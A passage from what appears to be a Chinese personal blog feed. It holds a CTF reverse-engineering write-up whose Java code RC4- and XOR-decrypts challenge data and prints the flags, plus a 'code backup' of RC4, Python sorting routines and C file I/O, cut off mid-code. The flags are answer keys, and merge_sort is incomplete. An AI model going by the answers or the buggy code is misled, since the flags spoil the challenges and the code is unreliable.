<span class="number">256</span>;</div><div class="line">            temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i] + (iS[j] % <span class="number">256</span>)) % <span class="number">256</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</div><div class="line">    String key = <span class="string">"PassW0rd"</span>;               </div><div class="line">    <span class="keyword">byte</span>[] ke = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>) <span class="number">33</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">65</span>, (<span class="keyword">byte</span>) <span class="number">110</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, Byte.MIN_VALUE, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">98</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) <span class="number">76</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">127</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">39</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">90</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">99</span>, (<span class="keyword">byte</span>) <span class="number">108</span>, (<span class="keyword">byte</span>) <span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">78</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">70</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">116</span>, (<span class="keyword">byte</span>) <span class="number">2</span>, (<span class="keyword">byte</span>) <span class="number">126</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">73</span>, (<span class="keyword">byte</span>) <span class="number">13</span>, (<span class="keyword">byte</span>) <span class="number">113</span>, (<span class="keyword">byte</span>) <span class="number">73</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">82</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">114</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">120</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">92</span>, (<span class="keyword">byte</span>) <span class="number">7</span>, (<span class="keyword">byte</span>) <span class="number">115</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">19</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">10</span>, (<span class="keyword">byte</span>) <span class="number">44</span>, (<span class="keyword">byte</span>) <span class="number">77</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">76</span>&#125;;</div><div class="line">    String l = <span class="keyword">new</span> String(ke);    </div><div class="line">    System.out.println(encode(l,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8<br>flag : flag{Th1s_is_only_Rc4_you_Should_know_more}</p><h3 id="apk2"><a href="#apk2" class="headerlink" title="apk2"></a>apk2</h3><p>用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">   private static byte[] md5(String data) &#123;</div><div class="line">       try &#123;</div><div class="line">           MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;);</div><div class="line">           messageDigest.update(data.getBytes());</div><div class="line">           return messageDigest.digest();</div><div class="line">       &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">           e.printStackTrace();</div><div class="line">           return new byte[0];</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static byte[] encryptData(byte[] data, byte[] key) &#123;</div><div class="line">       byte keyLength = (byte) key.length;</div><div class="line">       byte[] cipherText = new byte[data.length];</div><div class="line">       for (int i = 0; i &lt; data.length; i++) &#123;</div><div class="line">           cipherText[i] = (byte) (data[i] ^ key[i % keyLength]);</div><div class="line">       &#125;</div><div class="line">       return cipherText;</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">   private static String generateRandomFilename(int length) &#123;</div><div class="line">       Random random = new Random();</div><div class="line">       StringBuilder stringBuilder = new StringBuilder(length);</div><div class="line">       for (int i = 0; i &lt; length; i++) &#123;</div><div class="line">           char temp = (char) random.nextInt(62);</div><div class="line">           if (temp &lt; &apos;\u001a&apos;) &#123;</div><div class="line">               temp = (char) (temp + 97);</div><div class="line">           &#125; else if (temp &lt; &apos;4&apos;) &#123;</div><div class="line">               temp = (char) (temp + 65);</div><div class="line">           &#125; else &#123;</div><div class="line">               temp = (char) (temp + 48);</div><div class="line">           &#125;</div><div class="line">           stringBuilder.append(temp);</div><div class="line">       &#125;</div><div class="line">       System.out.println(stringBuilder.toString());</div><div class="line">       return stringBuilder.toString();</div><div class="line">      </div><div class="line">   &#125;</div><div class="line">   private static byte[] readUri(String uri) throws IOException &#123;</div><div class="line">   File file = new File(uri);  </div><div class="line">       @SuppressWarnings(&quot;resource&quot;)</div><div class="line">InputStream inputStream = new FileInputStream(file);</div><div class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</div><div class="line">       byte[] buffer = new byte[1024];</div><div class="line">       while (true) &#123;</div><div class="line">           int read = inputStream.read(buffer);</div><div class="line">           if (read == -1) &#123;</div><div class="line">               return byteArrayOutputStream.toByteArray();</div><div class="line">           &#125;</div><div class="line">           byteArrayOutputStream.write(buffer, 0, read);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static void decode(byte[] cipherText) throws IOException &#123;</div><div class="line">   </div><div class="line">   </div><div class="line">   File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;);</div><div class="line">          try &#123;</div><div class="line">              FileOutputStream fileOutputStream = new FileOutputStream(outputFile);</div><div class="line">              fileOutputStream.write(cipherText);</div><div class="line">              fileOutputStream.close();</div><div class="line">          &#125;catch (Exception e) &#123;</div><div class="line">// TODO: handle exception</div><div class="line">&#125;</div><div class="line">          System.out.println(&quot;done&quot;);</div><div class="line">  </div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   </div><div class="line">   public static void main(String[] args) throws IOException &#123;</div><div class="line">   String password = &quot;Password&quot;;</div><div class="line">   byte[] key = md5(password);</div><div class="line">   String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;;</div><div class="line">   byte[] data=readUri(path);</div><div class="line">   byte[] data1=encryptData(data,key);</div><div class="line">   decode(data1);</div><div class="line">   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后用010打开，发现是一个压缩包，解压得到flag<br>flag{This_easy_encrypto_t0_file<em>hi$!&gt;</em>&lt;}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码备份</title>
    <link href="http://yoursite.com/2017/12/05/code/"/>
    <id>http://yoursite.com/2017/12/05/code/</id>
    <published>2017-12-05T11:48:44.582Z</published>
    <updated>2017-12-30T09:13:21.797Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下代码，方便使用<br><a id="more"></a></p><h1 id="1、java"><a href="#1、java" class="headerlink" title="1、java"></a>1、java</h1><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">HloveyRC4</span><span class="params">(String aInput,String aKey)</span>   </span></div><div class="line"><span class="function">   </span>&#123;   </div><div class="line">       <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];   </div><div class="line">       <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">           iS[i]=i;   </div><div class="line">             </div><div class="line">       <span class="keyword">int</span> j = <span class="number">1</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">short</span> i= <span class="number">0</span>;i&lt;<span class="number">256</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           iK[i]=(<span class="keyword">byte</span>)aKey.charAt((i % aKey.length()));   </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">         </div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">255</span>;i++)   </div><div class="line">       &#123;   </div><div class="line">           j=(j+iS[i]+iK[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">       &#125;   </div><div class="line">     </div><div class="line">     </div><div class="line">       <span class="keyword">int</span> i=<span class="number">0</span>;   </div><div class="line">       j=<span class="number">0</span>;   </div><div class="line">       <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();   </div><div class="line">       <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];   </div><div class="line">       <span class="keyword">for</span>(<span class="keyword">short</span> x = <span class="number">0</span>;x&lt;iInputChar.length;x++)   </div><div class="line">       &#123;   </div><div class="line">           i = (i+<span class="number">1</span>) % <span class="number">256</span>;   </div><div class="line">           j = (j+iS[i]) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> temp = iS[i];   </div><div class="line">           iS[i]=iS[j];   </div><div class="line">           iS[j]=temp;   </div><div class="line">           <span class="keyword">int</span> t = (iS[i]+(iS[j] % <span class="number">256</span>)) % <span class="number">256</span>;   </div><div class="line">           <span class="keyword">int</span> iY = iS[t];   </div><div class="line">           <span class="keyword">char</span> iCY = (<span class="keyword">char</span>)iY;   </div><div class="line">           iOutputChar[x] =(<span class="keyword">char</span>)( iInputChar[x] ^ iCY) ;      </div><div class="line">       &#125;   </div><div class="line">         </div><div class="line">       <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);   </div><div class="line">                 </div><div class="line">   &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">  String inputStr = <span class="string">"7894dsfdsdfsd"</span>;      </div><div class="line">    String key = <span class="string">"abcdefg"</span>;         </div><div class="line">      </div><div class="line">    String str = HloveyRC4(inputStr,key);  </div><div class="line">      </div><div class="line">    <span class="comment">//打印加密后的字符串      </span></div><div class="line">    System.out.println(str);    </div><div class="line">      </div><div class="line">    <span class="comment">//打印解密后的字符串      </span></div><div class="line">    System.out.println(HloveyRC4(str,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="byte和Strings互转"><a href="#byte和Strings互转" class="headerlink" title="byte和Strings互转"></a>byte和Strings互转</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">String str = &quot;hello&quot;;</div><div class="line">byte[] srtbyte = null;</div><div class="line">try &#123;</div><div class="line">srtbyte = str.getBytes(&quot;UTF-8&quot;);</div><div class="line">String res = new String(srtbyte,&quot;UTF-8&quot;);</div><div class="line">System.out.println(res);</div><div class="line">    &#125; catch (UnsupportedEncodingException e) &#123;</div><div class="line">e.printStackTrace();</div><div class="line">    &#125;</div></pre></td></tr></table></figure><h1 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h1><p>8种排序，插入排序、希尔排序、冒泡排序、快速排序、直接选择排序、堆排序、归并排序、基数排序。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#插入排序,时间复杂度为O(n^2)。是稳定的排序方法。</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count=len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count):</div><div class="line">        key=lst[i]</div><div class="line">        j=i<span class="number">-1</span></div><div class="line">        <span class="keyword">while</span> j&gt;=<span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> lst[j]&gt;key:</div><div class="line">                lst[j+<span class="number">1</span>]=lst[j]</div><div class="line">                lst[j]=key</div><div class="line">            j-=<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 希尔排序是插入排序的一种希尔排序是非稳定排序算法</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    step = <span class="number">2</span></div><div class="line">    group = count / step</div><div class="line">    <span class="keyword">while</span> group &gt; <span class="number">0</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, group):</div><div class="line">            j = i + group</div><div class="line">            <span class="keyword">while</span> j &lt; count:</div><div class="line">                k = j - group</div><div class="line">                key = lst[j]</div><div class="line">                <span class="keyword">while</span> k &gt;= <span class="number">0</span>:</div><div class="line">                    <span class="keyword">if</span> lst[k] &gt; key:</div><div class="line">                        lst[k + group] = lst[k]</div><div class="line">                        lst[k] = key</div><div class="line">                    k -= group</div><div class="line">                j += group</div><div class="line">        group /= step</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 冒泡排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[i] &gt; lst[j]:</div><div class="line">                lst[i], lst[j] = lst[j], lst[i]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 选择排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    count = len(lst)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, count):</div><div class="line">        min = i</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, count):</div><div class="line">            <span class="keyword">if</span> lst[min] &gt; lst[j]:</div><div class="line">                min = j</div><div class="line">        lst[min], lst[i] = lst[i], lst[min]</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment"># 快速排序,整个排序过程可以递归进行</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(lst, left, right)</span>:</span></div><div class="line">    <span class="keyword">if</span> left &gt;= right:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    key = lst[left]</div><div class="line">    low = left</div><div class="line">    high = right</div><div class="line">    <span class="keyword">while</span> left &lt; right:</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[right] &gt;= key:</div><div class="line">            right -= <span class="number">1</span></div><div class="line">        lst[left] = lst[right]</div><div class="line">        <span class="keyword">while</span> left &lt; right <span class="keyword">and</span> lst[left] &lt;= key:</div><div class="line">            left += <span class="number">1</span></div><div class="line">        lst[right] = lst[left]</div><div class="line">    lst[right] = key</div><div class="line">    quick_sort(lst, low, left - <span class="number">1</span>)</div><div class="line">    quick_sort(lst, left + <span class="number">1</span>, high)</div><div class="line">    <span class="keyword">return</span> lst</div><div class="line"></div><div class="line"><span class="comment">#堆排序是指利用堆积树数据结构,它是选择排序的一种,堆分为大根堆和小根堆，是完全二叉树,大根堆的要求是每个节点的值都不大于其父节点的值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">adjust_heap</span><span class="params">(lst, i, size)</span>:</span></div><div class="line">    lchild = <span class="number">2</span> * i + <span class="number">1</span></div><div class="line">    rchild = <span class="number">2</span> * i + <span class="number">2</span></div><div class="line">    max = i</div><div class="line">    <span class="keyword">if</span> i &lt; size / <span class="number">2</span>:</div><div class="line">        <span class="keyword">if</span> lchild &lt; size <span class="keyword">and</span> lst[lchild] &gt; lst[max]:</div><div class="line">            max = lchild</div><div class="line">        <span class="keyword">if</span> rchild &lt; size <span class="keyword">and</span> lst[rchild] &gt; lst[max]:</div><div class="line">            max = rchild</div><div class="line">        <span class="keyword">if</span> max != i:</div><div class="line">            lst[max], lst[i] = lst[i], lst[max]</div><div class="line">            adjust_heap(lst, max, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_heap</span><span class="params">(lst, size)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, (size/<span class="number">2</span>))[::<span class="number">-1</span>]:</div><div class="line">        adjust_heap(lst, i, size)</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    size = len(lst)</div><div class="line">    build_heap(lst, size)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size)[::<span class="number">-1</span>]:</div><div class="line">        lst[<span class="number">0</span>], lst[i] = lst[i], lst[<span class="number">0</span>]</div><div class="line">        adjust_heap(lst, <span class="number">0</span>, i)</div><div class="line"></div><div class="line"><span class="comment">#归并排序</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(left, right)</span>:</span></div><div class="line">    i, j = <span class="number">0</span>, <span class="number">0</span></div><div class="line">    result = []</div><div class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</div><div class="line">        <span class="keyword">if</span> left[i] &lt;= right[j]:</div><div class="line">            result.append(left[i])</div><div class="line">            i += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result.append(right[j])</div><div class="line">            j += <span class="number">1</span></div><div class="line">    result += left[i:]</div><div class="line">    result += right[j:]</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_sort</span><span class="params">(lst)</span>:</span></div><div class="line">    <span class="comment"># 归并排序</span></div><div class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> lst</div><div class="line">    num = len(lst) / <span class="number">2</span></div><div class="line">    left = merge_sort(lst[:num])</div><div class="line">    right = merge_sort(lst[num:])</div><div class="line"></div><div class="line"><span class="comment">#基数排序</span></div><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">radix_sort</span><span class="params">(lst, radix=<span class="number">10</span>)</span>:</span></div><div class="line">    k = int(math.ceil(math.log(max(lst), radix)))</div><div class="line">    bucket = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(radix)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, k+<span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> lst:</div><div class="line">            bucket[j/(radix**(i<span class="number">-1</span>)) % (radix**i)].append(j)</div><div class="line">        <span class="keyword">del</span> lst[:]</div><div class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> bucket:</div><div class="line">            lst += z</div><div class="line">            <span class="keyword">del</span> z[:]</div><div class="line">    <span class="keyword">return</span> lst</div></pre></td></tr></table></figure></p><h1 id="3、java-apk"><a href="#3、java-apk" class="headerlink" title="3、java(apk)"></a>3、java(apk)</h1><h2 id="1、将字符串写在strings-xml里面"><a href="#1、将字符串写在strings-xml里面" class="headerlink" title="1、将字符串写在strings.xml里面"></a>1、将字符串写在strings.xml里面</h2><p>开发<br>apk-&gt;app-&gt;src-&gt;main-&gt;res-&gt;values-&gt;strings.xml<br><code>&lt;string name=&quot;user_name&quot;&gt;ESE_1996&lt;/string&gt;</code><br><code>name.getText().toString().equals(getResources().getString(R.string.user_name))</code><br>做题<br>Resources-&gt;resources.arsc-&gt;res-&gt;values-&gt;string.xml</p><h1 id="4、C"><a href="#4、C" class="headerlink" title="4、C"></a>4、C</h1><p>读取文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    FILE *stream;</div><div class="line">    <span class="keyword">char</span> <span class="built_in">list</span>[<span class="number">20000</span>];</div><div class="line">    <span class="keyword">int</span> start,end,fd,size;</div><div class="line">    <span class="keyword">int</span> i, numread, numwritten;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++ )</div><div class="line">        <span class="built_in">list</span>[i] = (<span class="keyword">char</span>)(<span class="string">'z'</span>);</div><div class="line">    start=clock();</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"w+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numwritten = fwrite( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span 